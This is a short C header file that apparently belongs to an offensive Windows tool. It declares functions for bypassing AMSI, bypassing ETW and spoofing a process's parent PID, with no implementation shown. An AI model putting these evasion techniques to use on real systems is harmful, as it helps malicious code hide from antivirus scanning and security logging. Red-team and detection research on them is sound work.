// include/evasion.h
#pragma once
#include <windows.h>

// Mod 105: AMSI bypass
BOOL patch_amsi();

// Mod 110: ETW bypass
BOOL patch_etw();

// Mod 47: PPID spoofing
BOOL ppid_spoof(DWORD parentPid, LPCSTR targetExe,
                PPROCESS_INFORMATION pPi);
